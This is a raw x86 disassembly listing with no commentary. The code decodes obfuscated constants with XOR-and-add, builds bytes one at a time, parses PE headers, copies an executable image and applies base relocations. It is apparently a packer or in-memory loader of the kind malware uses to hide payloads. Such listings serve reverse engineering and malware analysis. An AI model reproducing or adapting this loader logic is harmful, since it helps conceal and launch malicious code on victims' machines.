  420bc3:	mov    ecx,DWORD PTR [ebp-0x18]
  420bc6:	xor    ecx,ebx
  420bc8:	lea    ecx,[ecx+edi*1+0x3272fa]
  420bcf:	xor    ecx,ebx
  420bd1:	cmp    ecx,0xf89c85bd
  420bd7:	jne    0x420ba0
  420bd9:	jmp    0x420be2
  420bdb:	mov    eax,DWORD PTR [ebp-0x10]
  420bde:	xor    eax,ebx
  420be0:	add    eax,esi
  420be2:	mov    ecx,DWORD PTR [ebp-0x10]
  420be5:	xor    ecx,ebx
  420be7:	add    ecx,esi
  420be9:	cmp    ecx,eax
  420beb:	je     0x420d61
  420bf1:	mov    eax,DWORD PTR [ebp-0x14]
  420bf4:	mov    eax,DWORD PTR [eax+0x8]
  420bf7:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  420bfe:	mov    DWORD PTR [ebp-0x40],0xf89cc3c6
  420c05:	mov    DWORD PTR [ebp-0x44],0xf89cb5b5
  420c0c:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  420c13:	mov    DWORD PTR [ebp-0x20],eax
  420c16:	mov    eax,DWORD PTR [ebp+0x8]
  420c19:	mov    ecx,DWORD PTR [ebp-0x24]
  420c1c:	xor    ecx,ebx
  420c1e:	add    ecx,esi
  420c20:	push   ecx
  420c21:	mov    ecx,DWORD PTR [ebp-0x44]
  420c24:	mov    eax,DWORD PTR [eax+0x1e0]
  420c2a:	xor    ecx,ebx
  420c2c:	add    ecx,esi
  420c2e:	push   ecx
  420c2f:	mov    ecx,DWORD PTR [ebp-0x40]
  420c32:	xor    ecx,ebx
  420c34:	add    ecx,esi
  420c36:	push   ecx
  420c37:	mov    ecx,DWORD PTR [ebp-0xc]
  420c3a:	xor    ecx,ebx
  420c3c:	add    ecx,esi
  420c3e:	push   ecx
  420c3f:	call   DWORD PTR [eax+0x14]
  420c42:	mov    edi,eax
  420c44:	mov    eax,DWORD PTR [ebp+0x8]
  420c47:	mov    ecx,DWORD PTR [ebp-0x24]
  420c4a:	mov    eax,DWORD PTR [eax+0x1e0]
  420c50:	xor    ecx,ebx
  420c52:	add    ecx,esi
  420c54:	push   ecx
  420c55:	mov    ecx,DWORD PTR [ebp-0x44]
  420c58:	xor    ecx,ebx
  420c5a:	add    ecx,esi
  420c5c:	push   ecx
  420c5d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c60:	push   DWORD PTR [ebp-0x20]
  420c63:	xor    ecx,ebx
  420c65:	add    ecx,esi
  420c67:	push   ecx
  420c68:	call   DWORD PTR [eax+0x14]
  420c6b:	mov    ecx,DWORD PTR [ebp-0xc]
  420c6e:	xor    ecx,ebx
  420c70:	add    ecx,esi
  420c72:	mov    DWORD PTR [ebp-0x24],eax
  420c75:	cmp    ecx,edi
  420c77:	je     0x421004
  420c7d:	mov    ecx,DWORD PTR [ebp-0xc]
  420c80:	xor    ecx,ebx
  420c82:	add    ecx,esi
  420c84:	cmp    ecx,eax
  420c86:	je     0x421004
  420c8c:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  420c93:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420c9a:	mov    ecx,DWORD PTR [ebp-0x40]
  420c9d:	xor    cl,0xb3
  420ca0:	sub    cl,0x6
  420ca3:	mov    BYTE PTR [edi],cl
  420ca5:	mov    ecx,DWORD PTR [ebp-0xc]
  420ca8:	xor    cl,0xb3
  420cab:	sub    cl,0x6
  420cae:	mov    BYTE PTR [edi+0x1],cl
  420cb1:	mov    ecx,DWORD PTR [ebp-0x54]
  420cb4:	xor    cl,0xb3
  420cb7:	sub    cl,0x6
  420cba:	mov    BYTE PTR [edi+0x2],cl
  420cbd:	and    DWORD PTR [ebp-0xc8],0x0
  420cc4:	and    DWORD PTR [ebp-0xdc],0x0
  420ccb:	lea    ecx,[ebp-0xdc]
  420cd1:	push   ecx
  420cd2:	push   DWORD PTR [ebp-0x20]
  420cd5:	push   eax
  420cd6:	lea    eax,[ebp-0xc8]
  420cdc:	push   eax
  420cdd:	mov    eax,DWORD PTR [ebp-0x14]
  420ce0:	push   DWORD PTR [eax+0xc]
  420ce3:	mov    eax,DWORD PTR [ebp-0x2c]
  420ce6:	add    eax,0x10
  420ce9:	push   eax
  420cea:	push   edi
  420ceb:	call   0x41ff8f
  420cf0:	mov    DWORD PTR [ebp-0x40],eax
  420cf3:	mov    eax,DWORD PTR [ebp+0x8]
  420cf6:	mov    ecx,DWORD PTR [ebp-0x50]
  420cf9:	mov    eax,DWORD PTR [eax+0x1e0]
  420cff:	xor    ecx,ebx
  420d01:	add    ecx,esi
  420d03:	push   ecx
  420d04:	mov    ecx,DWORD PTR [ebp-0xc]
  420d07:	xor    ecx,ebx
  420d09:	add    ecx,esi
  420d0b:	push   ecx
  420d0c:	push   edi
  420d0d:	call   DWORD PTR [eax+0x18]
  420d10:	mov    eax,DWORD PTR [ebp-0x40]
  420d13:	add    eax,0xffcd8d06
  420d18:	xor    eax,ebx
  420d1a:	cmp    eax,0xf89c85b5
  420d1f:	mov    eax,DWORD PTR [ebp+0x8]
  420d22:	mov    eax,DWORD PTR [eax+0x1e0]
  420d28:	mov    ecx,DWORD PTR [ebp-0x50]
  420d2b:	jne    0x420d4e
  420d2d:	xor    ecx,ebx
  420d2f:	add    ecx,esi
  420d31:	push   ecx
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	xor    ecx,ebx
  420d37:	add    ecx,esi
  420d39:	push   ecx
  420d3a:	push   DWORD PTR [ebp-0x2c]
  420d3d:	call   DWORD PTR [eax+0x18]
  420d40:	mov    eax,DWORD PTR [ebp-0x24]
  420d43:	mov    DWORD PTR [ebp-0x2c],eax
  420d46:	mov    eax,DWORD PTR [ebp-0x20]
  420d49:	mov    DWORD PTR [ebp-0x3c],eax
  420d4c:	jmp    0x420d61
  420d4e:	xor    ecx,ebx
  420d50:	add    ecx,esi
  420d52:	push   ecx
  420d53:	mov    ecx,DWORD PTR [ebp-0xc]
  420d56:	xor    ecx,ebx
  420d58:	add    ecx,esi
  420d5a:	push   ecx
  420d5b:	push   DWORD PTR [ebp-0x24]
  420d5e:	call   DWORD PTR [eax+0x18]
  420d61:	mov    eax,DWORD PTR [ebp-0x3c]
  420d64:	mov    DWORD PTR [ebp-0x34],eax
  420d67:	mov    eax,DWORD PTR [ebp-0x2c]
  420d6a:	mov    DWORD PTR [ebp-0x28],0xf89c85b5
  420d71:	mov    DWORD PTR [ebp-0x40],eax
  420d74:	mov    edi,0xf89c85b4
  420d79:	mov    DWORD PTR [ebp-0x30],edi
  420d7c:	mov    eax,DWORD PTR [ebp-0x28]
  420d7f:	xor    eax,ebx
  420d81:	add    eax,esi
  420d83:	mov    DWORD PTR [ebp-0xc],eax
  420d86:	mov    eax,DWORD PTR [ebp-0x28]
  420d89:	xor    eax,ebx
  420d8b:	add    eax,esi
  420d8d:	mov    DWORD PTR [ebp-0x14],eax
  420d90:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  420d97:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  420d9e:	mov    eax,DWORD PTR [ebp-0x28]
  420da1:	mov    ecx,DWORD PTR [ebp-0x34]
  420da4:	xor    eax,ebx
  420da6:	add    eax,esi
  420da8:	cmp    ecx,eax
  420daa:	je     0x420fa0
  420db0:	jmp    0x420f7c
  420db5:	mov    ecx,DWORD PTR [ebp-0xc]
  420db8:	mov    eax,DWORD PTR [ebp-0x34]
  420dbb:	sub    eax,ecx
  420dbd:	mov    ecx,DWORD PTR [ebp-0x44]
  420dc0:	xor    ecx,ebx
  420dc2:	add    ecx,esi
  420dc4:	xor    edx,edx
  420dc6:	div    ecx
  420dc8:	mov    DWORD PTR [ebp-0x14],eax
  420dcb:	mov    eax,DWORD PTR [ebp-0x24]
  420dce:	mov    ecx,DWORD PTR [ebp-0x14]
  420dd1:	xor    eax,ebx
  420dd3:	add    eax,esi
  420dd5:	cmp    ecx,eax
  420dd7:	jbe    0x420de3
  420dd9:	mov    eax,DWORD PTR [ebp-0x24]
  420ddc:	xor    eax,ebx
  420dde:	add    eax,esi
  420de0:	mov    DWORD PTR [ebp-0x14],eax
  420de3:	mov    eax,DWORD PTR [ebp-0x44]
  420de6:	mov    ecx,DWORD PTR [ebp-0x14]
  420de9:	xor    eax,ebx
  420deb:	add    eax,esi
  420ded:	imul   eax,ecx
  420df0:	mov    DWORD PTR [ebp-0x14],eax
  420df3:	mov    eax,DWORD PTR [ebp-0x28]
  420df6:	mov    ecx,DWORD PTR [ebp-0x14]
  420df9:	xor    eax,ebx
  420dfb:	add    eax,esi
  420dfd:	cmp    ecx,eax
  420dff:	je     0x420f6a
  420e05:	mov    eax,DWORD PTR [ebp-0x14]
  420e08:	mov    DWORD PTR [ebp-0x20],eax
  420e0b:	mov    eax,DWORD PTR [ebp-0xc]
  420e0e:	add    eax,DWORD PTR [ebp-0x40]
  420e11:	mov    DWORD PTR [ebp-0x4c],0xf89c85b5
  420e18:	mov    DWORD PTR [ebp-0x14],edi
  420e1b:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  420e22:	mov    DWORD PTR [ebp-0x1c],eax
  420e25:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420e2c:	mov    DWORD PTR [ebp-0x8],edi
  420e2f:	mov    eax,DWORD PTR [ebp-0x4c]
  420e32:	xor    eax,ebx
  420e34:	add    eax,esi
  420e36:	jmp    0x420f29
  420e3b:	mov    DWORD PTR [ebp-0xe4],0xf89c85a2
  420e45:	mov    DWORD PTR [ebp-0xd0],0xf89c85af
  420e4f:	mov    eax,DWORD PTR [ebp-0x8]
  420e52:	mov    ecx,DWORD PTR [ebp-0x18]
  420e55:	xor    eax,ebx
  420e57:	add    eax,esi
  420e59:	imul   eax,ecx
  420e5c:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e5f:	mov    al,BYTE PTR [eax+ecx*1]
  420e62:	mov    BYTE PTR [ebp-0x1],al
  420e65:	mov    eax,DWORD PTR [ebp-0x8]
  420e68:	mov    ecx,DWORD PTR [ebp-0x18]
  420e6b:	xor    eax,ebx
  420e6d:	add    eax,esi
  420e6f:	imul   eax,ecx
  420e72:	mov    ecx,DWORD PTR [ebp-0x54]
  420e75:	xor    ecx,ebx
  420e77:	add    eax,ecx
  420e79:	mov    ecx,DWORD PTR [ebp-0x1c]
  420e7c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420e84:	mov    ecx,DWORD PTR [ebp-0xe4]
  420e8a:	xor    ecx,ebx
  420e8c:	lea    eax,[ecx+eax*1+0x3272fa]
  420e93:	movzx  ecx,BYTE PTR [ebp-0x1]
  420e97:	xor    ecx,eax
  420e99:	mov    BYTE PTR [ebp-0x1],cl
  420e9c:	mov    al,BYTE PTR [ebp-0x1]
  420e9f:	mov    ecx,DWORD PTR [ebp-0x8]
  420ea2:	mov    edx,DWORD PTR [ebp-0x18]
  420ea5:	xor    ecx,ebx
  420ea7:	add    ecx,esi
  420ea9:	imul   ecx,edx
  420eac:	mov    edx,DWORD PTR [ebp-0x1c]
  420eaf:	mov    BYTE PTR [ecx+edx*1],al
  420eb2:	mov    eax,DWORD PTR [ebp-0x8]
  420eb5:	mov    ecx,DWORD PTR [ebp-0x18]
  420eb8:	xor    eax,ebx
  420eba:	add    eax,esi
  420ebc:	imul   eax,ecx
  420ebf:	mov    ecx,DWORD PTR [ebp-0x1c]
  420ec2:	mov    al,BYTE PTR [eax+ecx*1]
  420ec5:	mov    BYTE PTR [ebp-0x1],al
  420ec8:	mov    eax,DWORD PTR [ebp-0x8]
  420ecb:	mov    ecx,DWORD PTR [ebp-0x18]
  420ece:	xor    eax,ebx
  420ed0:	add    eax,esi
  420ed2:	imul   eax,ecx
  420ed5:	mov    ecx,DWORD PTR [ebp-0x14]
  420ed8:	xor    ecx,ebx
  420eda:	add    eax,ecx
  420edc:	mov    ecx,DWORD PTR [ebp-0x1c]
  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
